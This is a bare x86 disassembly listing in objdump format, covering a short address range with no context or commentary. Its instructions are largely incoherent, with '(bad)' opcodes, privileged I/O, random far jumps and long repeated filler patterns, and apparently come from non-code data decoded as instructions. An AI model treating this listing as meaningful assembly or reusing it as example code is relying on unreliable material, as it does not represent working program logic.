  41787c:	inc    eax
  41787d:	int3   
  41787e:	icebp  
  41787f:	aaa    
  417880:	sub    ecx,ecx
  417882:	repz inc ecx
  417884:	sub    edx,DWORD PTR [edi-0x13]
  417887:	ss jg  0x4178e5
  41788a:	sub    BYTE PTR [eax+ebp*1-0x31],bl
  41788e:	repz pop ebx
  417890:	or     DWORD PTR [ebp+0x6a5f6732],eax
  417896:	repz (bad) 
  417898:	jge    0x417912
  41789a:	ss ja  0x417914
  41789d:	in     eax,0x53
  41789f:	add    BYTE PTR ds:0xa741ed7,dl
  4178a5:	cmp    BYTE PTR [esi],dh
  4178a7:	pop    edi
  4178a8:	pop    ss
  4178a9:	ds add al,0x2e
  4178ac:	and    DWORD PTR [edi],esi
  4178ae:	xor    al,0x0
  4178b0:	addr16 jmp 0x4178d2
  4178b3:	jo     0x4178ee
  4178b5:	add    eax,0x9f4523f
  4178ba:	push   esi
  4178bb:	push   esi
  4178bc:	dec    esi
  4178bd:	add    cl,dl
  4178bf:	add    ebp,ecx
  4178c1:	and    BYTE PTR [edx],bl
  4178c3:	aaa    
  4178c4:	in     al,0x16
  4178c6:	sbb    DWORD PTR [eax],esp
  4178c8:	sbb    ebp,ebp
  4178ca:	xlat   BYTE PTR ds:[ebx]
  4178cb:	in     eax,dx
  4178cc:	fsubr  st,st(1)
  4178ce:	out    0x30,al
  4178d0:	enter  0xf91c,0x19
  4178d4:	out    dx,al
  4178d5:	adc    al,0xc
  4178d7:	out    dx,al
  4178d8:	leave  
  4178d9:	jmp    0x140b9ac4
  4178de:	shl    ebx,cl
	...
  4178f4:	xchg   edi,eax
  4178f5:	sbb    al,0xc3
  4178f7:	xor    eax,0xedda319a
  4178fc:	test   eax,0x1ed9e6ea
  417901:	push   edx
  417902:	lods   al,BYTE PTR ds:[esi]
  417903:	push   ebp
  417904:	adc    BYTE PTR [ecx-0x67],0x51
  417908:	pop    esp
  417909:	add    BYTE PTR [ebp-0x631f96b1],ch
  41790f:	sbb    al,BYTE PTR [eax+eax*1+0x36894fad]
  417916:	mov    ?,WORD PTR [edx]
  417918:	cmp    DWORD PTR [ecx],esi
  41791a:	sub    BYTE PTR [edi],0x5a
  41791d:	xor    DWORD PTR [ebp-0x18ebadd5],edi
  417923:	push   esi
  417924:	test   BYTE PTR [esi],bh
  417926:	xchg   ebx,eax
  417927:	push   edx
  417928:	push   cs
  417929:	push   edx
  41792a:	lods   al,BYTE PTR ds:[esi]
  41792b:	inc    edi
  41792c:	imul   edx,DWORD PTR ds:0x3e121a89,0x3b
  417933:	push   esp
  417934:	pop    ecx
  417935:	icebp  
  417936:	or     al,0xf1
  417938:	adc    dl,BYTE PTR [ecx+0x4a]
  41793b:	ss push ds
  41793d:	xor    BYTE PTR [ebx+0x35],dl
  417940:	cmp    DWORD PTR [ecx+0x36],edx
  417943:	inc    edx
  417944:	in     eax,dx
  417945:	dec    esp
  417946:	sub    BYTE PTR [esi-0x6],dl
  417949:	inc    ebx
  41794a:	add    BYTE PTR [ebx],bl
  41794c:	and    BYTE PTR [edx],ah
  41794e:	ins    DWORD PTR es:[edi],dx
  41794f:	cld    
  417950:	clc    
  417951:	dec    ebx
  417952:	push   eax
  417953:	leave  
  417954:	ins    DWORD PTR es:[edi],dx
  417955:	shl    DWORD PTR [edi*1+0x0],cl
	...
  41796c:	sti    
  41796d:	dec    ebx
  41796e:	push   eax
  41796f:	cmp    al,BYTE PTR [esi+0x32]
  417972:	jbe    0x417978
  417974:	daa    
  417975:	das    
  417976:	add    BYTE PTR [edi],ch
  417978:	jmp    0x306b99cc
  41797d:	xor    DWORD PTR [esi-0x3],ebp
  417980:	cmp    bh,BYTE PTR [esi]
  417982:	push   esp
  417983:	sbb    DWORD PTR [ebp+0x3b],edx
  417986:	addr16 aad 0x57
  417989:	loope  0x4179ee
  41798b:	jmp    0xdab2bf1a
  417990:	imul   edx,DWORD PTR [ebx],0x4f3ac572
  417996:	arpl   WORD PTR [ebx-0x508ddeb8],di
  41799c:	pop    ebx
  41799d:	sbb    DWORD PTR [ebx-0x17],esp
  4179a0:	ja     0x4179d1
  4179a2:	arpl   WORD PTR [ebx-0x4fffc3bd],di
  4179a8:	push   eax
  4179a9:	sbb    eax,0x141b9074
  4179ae:	inc    esp
  4179af:	sub    BYTE PTR [ecx+eiz*1],0x61
  4179b3:	xchg   ebp,eax
  4179b4:	inc    ecx
  4179b5:	xor    dh,BYTE PTR [edi-0x17]
  4179b8:	push   0x13
  4179ba:	jb     0x417a31
  4179bc:	adc    BYTE PTR [ecx],dh
  4179be:	imul   ecx,DWORD PTR [ebx-0x65ffcdd9],0x1f
  4179c5:	xor    dh,BYTE PTR [esi+0x4c]
  4179c8:	outs   dx,DWORD PTR ds:[esi]
  4179c9:	dec    esp
  4179ca:	ja     0x417a25
  4179cc:	dec    esi
  4179cd:	add    BYTE PTR [eax],dl
  4179cf:	jmp    0x4179d4
	...
  4179e4:	cmp    al,BYTE PTR [eax]
  4179e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179e7:	es cli 
  4179e9:	jmp    FWORD PTR [ecx+0x0]
  4179ec:	add    eax,0x57817991
  4179f1:	call   0xffeb3020
  4179f6:	lahf   
  4179f7:	clc    
  4179f8:	jne    0x4179c5
  4179fa:	dec    bp
  4179fc:	stc    
  4179fd:	sti    
  4179fe:	xor    DWORD PTR [esi],ebp
  417a00:	test   esi,eax
  417a02:	das    
  417a03:	cmp    DWORD PTR [esi-0x55],edi
  417a06:	xor    al,0x0
  417a08:	and    BYTE PTR [edx-0x194f7fd],0xfc
  417a0f:	add    al,0x55
  417a11:	(bad)  
  417a12:	inc    BYTE PTR [edx]
  417a14:	push   eax
  417a15:	dec    ebx
  417a16:	imul   esp,DWORD PTR [esi+0x44],0xffffffef
  417a1a:	pop    esp
  417a1b:	jb     0x417a22
  417a1d:	cmp    al,0x4c
  417a1f:	imul   edi,esi,0xe4466ede
  417a25:	dec    edi
  417a26:	pop    esp
  417a27:	push   ebx
  417a28:	stc    
  417a29:	shl    DWORD PTR [eax+0x20],cl
  417a2c:	int    0xde
  417a2e:	ins    DWORD PTR es:[edi],dx
  417a2f:	popa   
  417a30:	test   DWORD PTR [edx],0x8d80072
  417a36:	outs   dx,DWORD PTR ds:[esi]
  417a37:	je     0x417a49
  417a39:	xor    ebp,DWORD PTR [edi+0x65]
  417a3c:	sar    bh,cl
  417a3e:	dec    edi
  417a3f:	popa   
  417a40:	shr    esp,cl
  417a42:	dec    DWORD PTR [edi-0x41]
  417a45:	in     eax,dx
  417a46:	jae    0x417a48
	...
  417a5c:	mov    ds:0x546f6902,al
  417a61:	add    ah,BYTE PTR [eax]
  417a63:	inc    esp
  417a64:	test   eax,0x935bffed
  417a69:	(bad)  
  417a6a:	popa   
  417a6b:	gs inc edx
  417a6d:	add    esi,DWORD PTR [ecx+0x63]
  417a70:	or     edi,esp
  417a72:	sub    eax,0x66df0564
  417a77:	add    BYTE PTR [ecx],bh
  417a79:	inc    esp
  417a7a:	xor    DWORD PTR [ebx+0x2b],esp
  417a7d:	mov    ds:0x33276d22,eax
  417a82:	sbb    esp,DWORD PTR [ebp+0x39]
  417a85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a86:	xor    ah,BYTE PTR [ebx+0xd]
  417a89:	in     eax,0x1a
  417a8b:	outs   dx,BYTE PTR ds:[esi]
  417a8c:	push   ss
  417a8d:	stc    
  417a8e:	adc    eax,0xe6f3e45f
  417a93:	and    DWORD PTR [ecx],edi
  417a95:	mov    bh,0x1
  417a97:	jbe    0x417a71
  417a99:	cld    
  417a9a:	arpl   WORD PTR cs:[edi+esi*4],bx
  417a9e:	add    DWORD PTR [ecx-0x1a],edx
  417aa1:	repnz das 
  417aa3:	jne    0x417a7d
  417aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aa6:	and    BYTE PTR [edx+ebp*8-0x1],bl
  417aaa:	push   ss
  417aab:	ins    DWORD PTR es:[edi],dx
  417aac:	iret   
  417aad:	or     al,0x23
  417aaf:	je     0x417a52
  417ab1:	mov    eax,0xcc895c18
  417ab6:	dec    ebp
  417ab7:	push   esp
  417ab8:	sub    BYTE PTR [ebp+0x52],0x63
  417abc:	stos   BYTE PTR es:[edi],al
  417abd:	(bad)  
  417abe:	sbb    al,0x6d
	...
  417ad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ad5:	add    WORD PTR [eax-0x62],cx
  417ad9:	sub    ax,0x984e
  417add:	mov    esp,0x66640020
  417ae2:	and    BYTE PTR [edx-0x79],dh
  417ae5:	js     0x417aff
  417ae7:	arpl   WORD PTR [ecx],di
  417ae9:	imul   esp,DWORD PTR [ecx+esi*2],0x7216826a
  417af0:	push   ebp
  417af1:	cdq    
  417af2:	push   ecx
  417af3:	ins    DWORD PTR es:[edi],dx
  417af4:	dec    ebx
  417af5:	and    eax,0x775c7333
  417afa:	and    BYTE PTR [edx+0x39],dh
  417afd:	test   DWORD PTR [eax],esp
  417aff:	jb     0x417b4d
  417b01:	adc    BYTE PTR [ebx],0x5f
  417b04:	and    eax,0x292d3b00
  417b09:	sbb    eax,0x302935e7
  417b0e:	sub    eax,0x4ed20950
  417b13:	sbb    DWORD PTR ds:0x1c362300,esp
  417b19:	sub    al,0x44
  417b1b:	xor    al,0xe6
  417b1d:	sbb    eax,DWORD PTR [edx]
  417b1f:	fstp   TBYTE PTR [esi+0x4d]
  417b22:	ds push ds
  417b24:	in     eax,dx
  417b25:	sub    cl,BYTE PTR [eax]
  417b27:	xor    bl,dl
  417b29:	inc    ebx
  417b2a:	sub    dl,BYTE PTR [edi]
  417b2c:	fistp  WORD PTR [ecx]
  417b2e:	or     al,0x21
  417b30:	clc    
  417b31:	sub    al,0x17
  417b33:	in     al,0xe9
  417b35:	adc    cl,BYTE PTR ds:0x30
	...
  417b4b:	add    ah,al
  417b4d:	and    cl,bh
  417b4f:	and    BYTE PTR [ecx],bh
  417b51:	cmp    bl,BYTE PTR [ebx]
  417b53:	push   esp
  417b54:	sbb    DWORD PTR [esp+eax*1],ebx
  417b57:	xor    ebp,DWORD PTR [ebp-0x5adb2ae9]
  417b5d:	pop    ss
  417b5e:	into   
  417b5f:	adc    eax,0x31cc2d59
  417b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b65:	sbb    ebx,ecx
  417b67:	add    edi,DWORD PTR [edi+0x4c]
  417b6a:	xchg   edi,eax
  417b6b:	jecxz  0x417b07
  417b6d:	sbb    edi,DWORD PTR [edx-0x37ed61d1]
  417b73:	das    
  417b74:	xchg   esi,eax
  417b75:	adc    DWORD PTR [ebp-0x73d2941d],edi
  417b7b:	xor    DWORD PTR [ecx],edi
  417b7d:	cmp    dh,BYTE PTR [ebx-0x73e3e6ad]
  417b83:	xor    ah,BYTE PTR [ebp+0x17]
  417b86:	jge    0x417bac
  417b88:	dec    ebp
  417b89:	pop    ss
  417b8a:	xchg   esi,eax
  417b8b:	adc    eax,0x32883019
  417b90:	dec    eax
  417b91:	sub    DWORD PTR [eax],eax
  417b93:	xchg   BYTE PTR [eax],cl
  417b95:	sbb    al,0x0
  417b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b98:	push   es
  417b99:	push   eax
  417b9a:	and    BYTE PTR [ebp+0x4e],cl
  417b9d:	das    
  417b9e:	je     0x417bf0
  417ba0:	dec    edi
  417ba1:	inc    ecx
  417ba2:	je     0x417be4
  417ba4:	inc    esp
  417ba5:	adc    ah,BYTE PTR [eax]
  417ba7:	pop    ecx
  417ba8:	sub    al,0x2e
  417baa:	je     0x417b95
  417bac:	dec    esp
  417bad:	dec    esp
  417bae:	push   eax
  417baf:	or     DWORD PTR [eax],eax
	...
  417bc1:	add    BYTE PTR [eax],al
  417bc3:	add    BYTE PTR [ecx+0x1d],bl
  417bc6:	jno    0x417c05
  417bc8:	and    dl,BYTE PTR [edx]
  417bca:	pop    edi
  417bcb:	xor    eax,0xc96e1352
  417bd0:	sbb    DWORD PTR [ecx+0x74],eax
  417bd3:	or     BYTE PTR [ecx+0x13],al
  417bd6:	gs jmp 0xc991c7f8
  417bdc:	or     ch,BYTE PTR [esi]
  417bde:	ins    DWORD PTR es:[edi],dx
  417bdf:	rdmsr  
  417be1:	adc    al,0x63
  417be3:	cli    
  417be4:	cmp    bh,BYTE PTR [edx]
  417be6:	push   esp
  417be7:	sbb    eax,ebp
  417be9:	pop    ss
  417bea:	arpl   bp,di
  417bec:	dec    esi
  417bed:	add    BYTE PTR [esi-0x23],ah
  417bf0:	push   0x2f
  417bf2:	push   0x2e144ec4
  417bf7:	iret   
  417bf8:	imul   ebx,DWORD PTR [ecx],0x1a2dba00
  417bfe:	je     0x417bbe
  417c00:	pop    ebx
  417c01:	arpl   WORD PTR cs:[ebp+0x450e14f],bx
  417c08:	push   0x7eb56613
  417c0d:	cmp    dl,BYTE PTR [ecx+edi*4+0x33]
  417c11:	adc    ah,BYTE PTR [esi-0x72]
  417c14:	jle    0x417c65
  417c16:	arpl   WORD PTR [ebp-0x5affcff1],bx
  417c1c:	sbb    ebp,DWORD PTR [edi+ebx*2]
  417c1f:	add    BYTE PTR [ebp+eax*1-0x1d5bff8e],bl
  417c26:	push   ebx
  417c27:	push   eax
	...
  417c3c:	cdq    
  417c3d:	or     ah,BYTE PTR [esi+0x6f]
  417c40:	mov    al,ds:0xe72614f
  417c45:	add    DWORD PTR [edx+0x4c],esi
  417c48:	or     edi,ebp
  417c4a:	jae    0x417c7a
  417c4c:	or     BYTE PTR [ecx],cl
  417c4e:	ins    BYTE PTR es:[edi],dx
  417c4f:	add    BYTE PTR [esi],dh
  417c51:	add    DWORD PTR [eax+0x75],edi
  417c54:	push   ebx
  417c55:	loop   0x417cbb
  417c57:	ins    BYTE PTR es:[edi],dx
  417c58:	std    
  417c59:	sti    
  417c5a:	gs je  0x417c9d
  417c5d:	out    dx,eax
  417c5e:	fs je  0x417c5e
  417c61:	leave  
  417c62:	data16 outs dx,BYTE PTR ds:[esi]
  417c64:	dec    ecx
  417c65:	cld    
  417c66:	inc    ebp
  417c67:	popa   
  417c68:	inc    ebx
  417c69:	lock dec esi
  417c6b:	je     0x417ca4
  417c6d:	or     ah,BYTE PTR [ecx+0x20]
  417c70:	and    ch,dh
  417c72:	push   0x77
  417c74:	push   ebx
  417c75:	add    DWORD PTR [edx+0x0],esi
  417c78:	push   ds
  417c79:	push   eax
  417c7a:	push   eax
  417c7b:	dec    esp
  417c7c:	cmp    edi,ebp
  417c7e:	jae    0x417cae
  417c80:	cmp    al,0xe2
  417c82:	call   FWORD PTR [ebx-0x1b]
  417c85:	loop   0x417cf6
  417c87:	ins    BYTE PTR es:[edi],dx
  417c88:	std    
  417c89:	xor    BYTE PTR [ebp+esi*2-0x14],dh
  417c8d:	cli    
  417c8e:	push   0x5c
  417c90:	jecxz  0x417c8d
  417c92:	jno    0x417d03
  417c94:	in     eax,0xfe
  417c96:	dec    edi
  417c97:	ins    BYTE PTR es:[edi],dx
  417c98:	int    0xd0
  417c9a:	jmp    FWORD PTR [edx]
  417c9c:	rol    BYTE PTR [ebx+0x0],1
  417c9f:	ret    
	...
  417cb4:	pushf  
  417cb5:	inc    ebx
  417cb6:	add    BYTE PTR [ebp-0x62],ah
  417cb9:	inc    ebx
  417cba:	add    BYTE PTR [edi-0x56],bl
  417cbd:	inc    ebx
  417cbe:	add    bh,dl
  417cc0:	cmp    DWORD PTR [ecx+eax*2+0x0],esp
  417cc4:	cmp    BYTE PTR [ecx+0x41],bl
  417cc7:	add    dh,ch
  417cc9:	jge    0x417d0c
  417ccb:	add    ch,ch
  417ccd:	je     0x417d10
  417ccf:	add    bh,bl
  417cd1:	jg     0x417d14
  417cd3:	add    BYTE PTR [ecx+esi*2],dl
  417cd6:	inc    ecx
  417cd7:	add    BYTE PTR [ecx+0x40],dl
  417cda:	inc    esp
  417cdb:	add    BYTE PTR [esi],al
  417cdd:	inc    edx
  417cde:	inc    esp
  417cdf:	add    BYTE PTR [ecx+0xb0043d4],bl
  417ce5:	dec    ecx
  417ce6:	inc    esp
  417ce7:	add    BYTE PTR [eax+0x4a],ah
  417cea:	inc    esp
  417ceb:	add    ch,cl
  417ced:	dec    edx
  417cee:	inc    esp
  417cef:	add    BYTE PTR [esi-0x1fffbbb6],cl
  417cf5:	inc    esp
  417cf6:	inc    esp
  417cf7:	add    BYTE PTR [ebp+ecx*1+0x44],bl
  417cfb:	add    BYTE PTR [ecx+0x7],ch
  417cfe:	inc    esp
  417cff:	add    BYTE PTR [eax],bl
  417d01:	push   cs
  417d02:	inc    esp
  417d03:	add    BYTE PTR [edx-0x1dffbbfd],ch
  417d09:	repz inc ebx
  417d0b:	add    BYTE PTR [edi-0x54ffbbf2],ch
  417d11:	cdq    
  417d12:	inc    ecx
  417d13:	add    BYTE PTR [ebp+0x4198],al
	...
  417d29:	add    BYTE PTR [eax],al
  417d2b:	add    BYTE PTR [edx-0x51ffbe45],al
  417d31:	mov    ch,0x41
  417d33:	add    BYTE PTR [ecx-0x4f],al
  417d36:	inc    ecx
  417d37:	add    BYTE PTR [eax+0x41b1],bl
  417d3d:	rol    DWORD PTR [ecx+0x0],0x25
  417d41:	ret    0x41
  417d44:	xchg   esp,eax
  417d45:	push   edx
  417d46:	inc    ecx
  417d47:	add    BYTE PTR [edx-0x79ffbbd9],al
  417d4d:	add    BYTE PTR [eax+0x44],dh
  417d50:	cmp    edi,esp
  417d52:	jo     0x417d98
  417d54:	cmp    DWORD PTR [edx+0x2139447d],edi
  417d5a:	jbe    0x417da0
  417d5c:	cmp    edi,esi
  417d5e:	pop    esi
  417d5f:	inc    esp
  417d60:	cmp    DWORD PTR [esi+0x5f],edi
  417d63:	inc    esp
  417d64:	cmp    ebp,esp
  417d66:	dec    edi
  417d67:	inc    esp
  417d68:	cmp    DWORD PTR [eax+edx*2+0x44],ebp
  417d6c:	cmp    eax,ebx
  417d6e:	add    BYTE PTR [ebx+0x39],0xba
  417d72:	add    DWORD PTR [ebx+0x39],0x39437238
  417d79:	push   edx
  417d7a:	jb     0x417dbf
  417d7c:	cmp    DWORD PTR [ebp-0x2ac6bc9e],ebp
  417d82:	add    BYTE PTR [ebx+0x39],0xcc
  417d86:	add    BYTE PTR [ebx+0x39],0x9d
  417d8a:	add    BYTE PTR [ebx+0x39],0x88
  417d8e:	bound  eax,QWORD PTR [ebx+0x0]
	...
  417da1:	add    BYTE PTR [eax],al
  417da3:	add    BYTE PTR [ecx],bh
  417da5:	pop    ecx
  417da6:	bound  eax,QWORD PTR [ebx+0x39]
  417da9:	stos   BYTE PTR es:[edi],al
  417daa:	push   edx
  417dab:	inc    ebx
  417dac:	cmp    DWORD PTR ds:0x6639434b,edx
  417db2:	inc    ebx
  417db3:	inc    ebx
  417db4:	cmp    DWORD PTR [edi+0x839433b],esi
  417dba:	xor    al,0x43
  417dbc:	cmp    DWORD PTR [edi],esp
  417dbe:	sub    al,0x43
  417dc0:	cmp    DWORD PTR [esi-0x5b],eax
  417dc3:	inc    ebx
  417dc4:	cmp    DWORD PTR [eax+0x6a39439d],esi
  417dca:	daa    
  417dcb:	inc    ebx
  417dcc:	cmp    ecx,esp
  417dce:	daa    
  417dcf:	inc    ebx
  417dd0:	cmp    DWORD PTR [ebx],esp
  417dd2:	sub    BYTE PTR [ebx+0x39],al
  417dd5:	mov    ebx,0x44394328
  417dda:	add    BYTE PTR [edx],ch
  417ddc:	jp     0x417dde
  417dde:	mov    ds:0x11007a2a,al
  417de3:	sub    eax,0x242e007a
  417de8:	jp     0x417dea
  417dea:	test   al,0x2c
  417dec:	jp     0x417dee
  417dee:	push   ebx
  417def:	and    BYTE PTR [edx+0x0],bh
  417df2:	stos   BYTE PTR es:[edi],al
  417df3:	xor    BYTE PTR [edx+0x0],bh
  417df6:	adc    al,0x2c
  417df8:	jp     0x417dfa
  417dfa:	js     0x417e20
  417dfc:	cli    
  417dfd:	dec    DWORD PTR [edi+0x18]
  417e00:	cli    
  417e01:	call   FWORD PTR [eax-0x46]
  417e04:	std    
  417e05:	call   DWORD PTR [edi+0xb4]
	...
  417e1b:	add    ch,dh
  417e1d:	(bad)  
  417e1e:	fidivr WORD PTR [ebp+edi*8-0xa4ead01]
  417e25:	call   FWORD PTR [ebp+0x1bfffda1]
  417e2b:	mov    al,ds:0x9088fff5
  417e30:	std    
  417e31:	inc    DWORD PTR [esi]
  417e33:	xchg   ebx,eax
  417e34:	cmc    
  417e35:	inc    DWORD PTR [ebx+eax*8-0x17000003]
  417e3c:	cmp    al,BYTE PTR [eax]
  417e3e:	add    cl,ch
  417e40:	cmp    al,BYTE PTR [eax]
  417e42:	add    cl,ch
  417e44:	cmp    al,BYTE PTR [eax]
  417e46:	add    cl,ch
  417e48:	cmp    al,BYTE PTR [eax]
  417e4a:	add    cl,ch
  417e4c:	cmp    al,BYTE PTR [eax]
  417e4e:	inc    ecx
  417e4f:	add    eax,0xf56e2162
  417e54:	sbb    al,BYTE PTR [ebp+0x5f]
  417e57:	ficom  DWORD PTR [edx+0x0]
  417e5a:	push   ecx
  417e5b:	mov    ch,0x7b
  417e5d:	xor    al,0x53
  417e5f:	mov    edx,0xb94b4627
  417e64:	imul   esi,DWORD PTR [edx],0x2f2d0054
  417e6a:	inc    edi
  417e6b:	add    BYTE PTR ds:0xa8652de8,dh
  417e71:	in     eax,0xff
  417e73:	and    al,0xf0
  417e75:	mov    dl,0x55
  417e77:	add    ah,al
  417e79:	bnd jo 0x417ee1
  417e7c:	ror    bh,1
  417e7e:	fs add BYTE PTR fs:[eax],al
	...
  417e92:	add    BYTE PTR [eax],al
  417e94:	(bad)  
  417e95:	loop   0x417ef3
  417e97:	je     0x417e79
  417e99:	or     DWORD PTR ds:0xa0dca0d,eax
  417e9f:	or     eax,esi
  417ea1:	mov    edx,0xa131756c
  417ea6:	or     cl,BYTE PTR [edx]
  417ea8:	and    ah,0x60
  417eab:	ins    BYTE PTR es:[edi],dx
  417eac:	xor    BYTE PTR [ecx],cl
  417eae:	and    DWORD PTR [ecx],esi
  417eb0:	xor    BYTE PTR [edx+ecx*1+0x65e9990a],ah
  417eb7:	and    BYTE PTR [ecx-0x16879d60],bl
  417ebd:	bnd jae 0x417ee0
  417ec0:	mov    DWORD PTR [eax-0x5f8edae3],esp
  417ec6:	push   es
  417ec7:	and    BYTE PTR [eax-0x19],al
  417eca:	push   0x74
  417ecc:	dec    edi
  417ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ece:	push   es
  417ecf:	and    BYTE PTR [edi],ch
  417ed1:	cmc    
  417ed2:	ins    BYTE PTR es:[edi],dx
  417ed3:	or     DWORD PTR [ebp+0xa],ebx
  417ed6:	and    BYTE PTR [ebp+esi*1-0x30],ah
  417eda:	pop    ds
  417edb:	or     DWORD PTR [eax-0x5b],esi
  417ede:	sub    eax,0x1da05020
  417ee3:	and    al,BYTE PTR ds:0x2021f5
  417ee9:	mov    al,ds:0xd510201d
  417eee:	addr16 gs in al,dx
  417ef1:	jmp    0x417f33
  417ef3:	js     0x417f2e
  417ef5:	int3   
  417ef6:	and    al,0x73
	...
  417f0c:	test   esp,eax
  417f0e:	inc    edx
  417f0f:	add    BYTE PTR [edx-0x7293d94f],cl
  417f15:	xchg   esi,eax
  417f16:	shr    DWORD PTR ds:0x2dc55d,cl
  417f1c:	push   esp
  417f1d:	push   ecx
  417f1e:	adc    DWORD PTR [esi+edx*2+0x77],ebp
  417f22:	es jb  0x417f34
  417f25:	test   BYTE PTR [ecx],bl
  417f27:	arpl   WORD PTR [ecx],di
  417f29:	push   esi
  417f2a:	out    dx,al
  417f2b:	cs sbb al,0xb4
  417f2e:	out    dx,al
  417f2f:	add    DWORD PTR cs:[ecx-0x56c6ffff],ebp
  417f36:	xor    al,0x63
  417f38:	add    BYTE PTR [ecx+edx*1+0x30162b63],al
  417f3f:	outs   dx,BYTE PTR ds:[esi]
  417f40:	sbb    BYTE PTR ds:0x302b5027,bh
  417f46:	push   ss
  417f47:	addr16 and eax,0x3963254c
  417f4d:	(bad)  
  417f4e:	es push esp
  417f50:	sbb    al,BYTE PTR [edi+0x34]
  417f53:	jb     0x417f65
  417f55:	shr    DWORD PTR [edx],cl
  417f57:	ins    BYTE PTR es:[edi],dx
  417f58:	fmul   QWORD PTR [ecx+0x27]
  417f5b:	add    BYTE PTR [edx],cl
  417f5d:	inc    esp
  417f5e:	inc    ecx
  417f5f:	push   0x6324f2d8
  417f64:	out    dx,eax
  417f65:	or     DWORD PTR [eax],ebx
  417f67:	addr16 fucomip st,st(7)
  417f6a:	xor    esi,DWORD PTR [edx-0x20]
  417f6d:	repnz sub ch,BYTE PTR [eax+eax*1+0x0]
	...
  417f82:	add    BYTE PTR [eax],al
  417f84:	fmul   QWORD PTR [ecx]
  417f86:	daa    
  417f87:	add    dl,ch
  417f89:	add    eax,DWORD PTR [ecx+0x72]
  417f8c:	pushf  
  417f8d:	or     BYTE PTR [eax],bl
  417f8f:	arpl   WORD PTR [ebp-0x689cd566],ax
  417f95:	add    BYTE PTR [edi-0x2fed69ef],dh
  417f9b:	das    
  417f9c:	call   0xa925:0x6803cc23
  417fa3:	and    al,0x98
  417fa5:	daa    
  417fa6:	mov    esp,0xd00e6913
  417fab:	adc    eax,0x26cc2c5e
  417fb0:	pop    edx
  417fb1:	add    BYTE PTR [edx-0x65da74d8],bl
  417fb7:	pop    ss
  417fb8:	dec    esp
  417fb9:	push   cs
  417fba:	test   BYTE PTR [ebx],dh
  417fbc:	dec    ebx
  417fbd:	sub    DWORD PTR [ebp-0x79daa2d4],ebx
  417fc3:	sub    BYTE PTR [ecx],bh
  417fc5:	das    
  417fc6:	mov    WORD PTR [edi+ecx*2+0x1f],cs
  417fca:	jns    0x417ff4
  417fcc:	push   ss
  417fcd:	jl     0x736caa07
  417fd3:	and    al,0x9
  417fd5:	push   cs
  417fd6:	push   eax
  417fd7:	push   ss
  417fd8:	push   ss
  417fd9:	sub    al,0x44
  417fdb:	daa    
  417fdc:	sbb    al,BYTE PTR [eax]
  417fde:	cmp    ch,BYTE PTR [ecx]
  417fe0:	dec    esi
  417fe1:	cvtps2pd xmm5,QWORD PTR ds:0x12172a1c
	...
  417ffc:	push   ss
  417ffd:	sub    eax,0x33ee1248
  418002:	inc    esi
  418003:	sub    ebx,edx
  418005:	sub    DWORD PTR [edi],edx
  418007:	adc    bl,dh
  418009:	adc    DWORD PTR [eax],edx
  41800b:	xor    dl,bl
  41800d:	and    al,BYTE PTR [esp+eax*1]
  418010:	cmp    DWORD PTR [eax],eax
  418012:	out    0x3,eax
  418014:	cmp    DWORD PTR [eax],eax
  418016:	out    0x3,eax
  418018:	cmp    DWORD PTR [eax],eax
  41801a:	out    0x3,eax
  41801c:	cmp    DWORD PTR [eax],eax
  41801e:	out    0x3,eax
  418020:	cmp    DWORD PTR [eax],eax
  418022:	add    cl,ch
  418024:	cmp    al,BYTE PTR [eax]
  418026:	add    cl,ch
  418028:	cmp    al,BYTE PTR [eax]
  41802a:	add    cl,ch
  41802c:	cmp    al,BYTE PTR [eax]
  41802e:	add    cl,ch
  418030:	cmp    al,BYTE PTR [eax]
  418032:	add    cl,ch
  418034:	cmp    al,BYTE PTR [eax]
  418036:	add    cl,ch
  418038:	cmp    al,BYTE PTR [eax]
  41803a:	add    cl,ch
  41803c:	cmp    al,BYTE PTR [eax]
  41803e:	add    cl,ch
  418040:	cmp    al,BYTE PTR [eax]
  418042:	add    cl,ch
  418044:	cmp    al,BYTE PTR [eax]
  418046:	add    cl,ch
  418048:	cmp    al,BYTE PTR [eax]
  41804a:	add    cl,ch
  41804c:	cmp    al,BYTE PTR [eax]
  41804e:	add    cl,ch
  418050:	cmp    al,BYTE PTR [eax]
  418052:	add    cl,ch
  418054:	cmp    al,BYTE PTR [eax]
  418056:	add    cl,ch
  418058:	cmp    al,BYTE PTR [eax]
  41805a:	add    cl,ch
  41805c:	cmp    al,BYTE PTR [eax]
  41805e:	add    cl,ch
	...
  418074:	cmp    al,BYTE PTR [eax]
  418076:	add    cl,ch
  418078:	cmp    al,BYTE PTR [eax]
  41807a:	add    cl,ch
  41807c:	cmp    al,BYTE PTR [eax]
  41807e:	add    cl,ch
  418080:	cmp    al,BYTE PTR [eax]
  418082:	add    cl,ch
  418084:	cmp    al,BYTE PTR [eax]
  418086:	add    cl,ch
  418088:	cmp    al,BYTE PTR [eax]
  41808a:	add    cl,ch
  41808c:	cmp    al,BYTE PTR [eax]
  41808e:	add    cl,ch
  418090:	cmp    al,BYTE PTR [eax]
  418092:	add    cl,ch
  418094:	cmp    al,BYTE PTR [eax]
  418096:	add    cl,ch
  418098:	cmp    al,BYTE PTR [eax]
  41809a:	add    cl,ch
  41809c:	cmp    al,BYTE PTR [eax]
  41809e:	add    cl,ch
  4180a0:	cmp    al,BYTE PTR [eax]
  4180a2:	add    cl,ch
  4180a4:	cmp    al,BYTE PTR [eax]
  4180a6:	add    cl,ch
  4180a8:	cmp    al,BYTE PTR [eax]
  4180aa:	add    cl,ch
  4180ac:	cmp    al,BYTE PTR [eax]
  4180ae:	add    BYTE PTR [eax],al
  4180b0:	push   eax
  4180b1:	std    
  4180b2:	(bad)  
  4180b3:	jmp    DWORD PTR [eax]
  4180b5:	std    
  4180b6:	(bad)  
  4180b7:	jmp    DWORD PTR [eax]
  4180b9:	std    
  4180ba:	(bad)  
  4180bb:	call   DWORD PTR [eax]
  4180bd:	std    
  4180be:	(bad)  
  4180bf:	call   DWORD PTR [eax]
  4180c1:	std    
  4180c2:	(bad)  
  4180c3:	jmp    DWORD PTR [eax]
  4180c5:	std    
  4180c6:	(bad)  
  4180c7:	jmp    DWORD PTR [eax]
